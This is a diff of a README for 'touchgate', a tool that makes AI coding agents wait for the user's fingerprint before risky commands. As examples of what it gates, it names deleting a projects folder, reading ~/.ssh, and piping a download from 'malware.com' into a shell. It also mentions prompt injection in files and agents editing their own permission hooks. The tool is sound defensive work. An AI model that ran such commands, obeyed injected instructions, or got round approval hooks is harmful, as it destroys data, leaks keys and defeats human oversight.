@@ -2,15 +2,15 @@
 
 fingerprint approval for risky ai agent actions
 
-your agent wants to `rm -rf ~/Projects`, force push, read `~/.ssh` or run `curl | sh`. touchgate pauses it and asks for your fingerprint first. touch the sensor and it goes through, do nothing and it gets denied. everything else runs like normal so you dont end up turning it off
+if your agent wants to `rm -rf ~/Projects`, force push something, read `~/.ssh` or run `curl malware.com | sh`. touchgate pauses it and asks for your fingerprint first. touch the sensor and it goes through, do nothing and it gets blockedd.
 
 works with claude code, codex and gemini cli. uses fprintd on linux, touch id on macos and windows hello on windows
 
 ## why
 
-agents run with your permissions. `--dangerously-skip-permissions` and auto modes are great until the one command you didnt read. normal permission prompts get clicked through, and a hook in your own settings can be edited by the same agent it is supposed to stop
+agents run with your permissions. `--dangerously-skip-permissions` and auto modes are great until the one command you didnt go over. if theres a prompt injection inside a file and your agent feels like executing it, ittl be blocked
 
-touchgate puts its hook and its rules in your agents' **managed** config, the admin level files that user and project settings cant override, and those files are owned by root. so the agent cant just edit its way past it. and the approval is your finger, not a y/n the agent could type
+touchgate puts its hook and its rules in your agents' **managed** config, the admin level files that user and project settings cant override, and those files are owned by root.
 
 ## install
 
@@ -18,6 +18,11 @@ touchgate puts its hook and its rules in your agents' **managed** config, the ad
 
 ```sh
 yay -S touchgate-git
+# or
+paru -S touchgate-git
+```
+then
+```bash
 sudo touchgate install
 touchgate doctor
 ```
@@ -30,9 +35,9 @@ sudo touchgate install
 touchgate doctor
 ```
 
-on windows run `touchgate install` from an admin terminal
+on windows run `touchgate install` from an admin terminal (pure slop btw)
 
-> you need a fingerprint reader with at least one finger enrolled. on linux thats fprintd (`fprintd-enroll`), on macos touch id, on windows a hello fingerprint, face or pin
+> you need a fingerprint reader with at least one finger enrolled.
 
 ## usage
 
